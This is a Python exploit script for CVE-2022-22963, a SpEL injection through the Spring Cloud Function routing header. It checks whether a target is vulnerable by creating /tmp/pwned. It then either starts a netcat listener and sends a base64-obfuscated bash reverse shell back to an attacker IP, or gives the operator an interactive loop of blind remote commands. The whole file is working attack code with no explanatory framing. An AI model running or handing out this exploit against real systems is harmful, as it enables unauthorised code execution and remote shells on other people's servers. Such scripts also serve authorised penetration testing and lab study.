#!/usr/bin/python3
import requests
import argparse
import time
from threading import Thread
import os
import base64
from termcolor import colored


def print_message(message, type):
    if type == 'SUCCESS':
        print('[' + colored('SUCCESS', 'green') +  '] ' + message)
    elif type == 'INFO':
        print('[' + colored('INFO', 'blue') +  '] ' + message)
    elif type == 'WARNING':
        print('[' + colored('WARNING', 'yellow') +  '] ' + message)
    elif type == 'ALERT':
        print('[' + colored('ALERT', 'yellow') +  '] ' + message)
    elif type == 'ERROR':
        print('[' + colored('ERROR', 'red') +  '] ' + message)


def nc_listener():
    os.system("nc -lnvp 4444")

def exploit(url,cmd):
    vulnURL = f'{url}/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    body = '.'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
        }
    response = requests.post(url = vulnURL, data = body, headers = headers, verify=False, timeout=5)
    return response

def check_vuln(resp):
    error_text = '"error":"Internal Server Error"'
    if resp.status_code == 500 and error_text in resp.text:
        print_message(f'[+] {target_url} is vulnerable\n', "SUCCESS")
        return True
    else:
        print_message(f'[-] {target_url} is not vulnerable\n', "ERROR")
        return False

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', type=str,
                        help='IP address of victim spring application (Default: 127.0.0.1)')
    parser.add_argument('-p', '--port', type=str,
                        help='Port of victim spring application (Default: 8080)')
    parser.add_argument('-I', '--atk-ip', type=str,
                        help='IP address of attacker')
    parser.add_argument('-P', '--atk-port', type=str, default="4444",
                        help='Port of attacker (Default:4444')
    args = parser.parse_args()
    
    target_url = f"http://{args.ip}:{args.port}"

    if args.ip is None or args.port is None:
        parser.print_help()
        exit(0)

    if args.atk_ip is not None:
        reverse_shell = True
    else:
        reverse_shell = False

    print_message(f"[+] Target {target_url}\n", "INFO")
    print_message(f"[+] Checking if {target_url} is vulnerable to CVE-2022-22963...\n", "INFO")
    response = exploit(target_url,"touch /tmp/pwned")
    v = check_vuln(response)
    if v:
        if reverse_shell:
            listener_thread = Thread(target=nc_listener)
            listener_thread.start()
            time.sleep(2)
            command = f"bash -i >& /dev/tcp/{args.atk_ip}/{args.atk_port} 0>&1"
            final_command = 'bash -c {echo,' + ((str(base64.b64encode(command.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'
            exploit(target_url,final_command)
        else:
            while True:
                print_message("Remote code execution", "INFO")
                print_message("No shell response will be shown, because the vulnerability does not allow it", "WARNING")
                input_command = input(colored('>>', 'green'))
                if input_command in {'q','exit','quit','exit()','quit()'}:
                    exit()
                exploit(target_url,input_command)
    else:
    	exit(0)
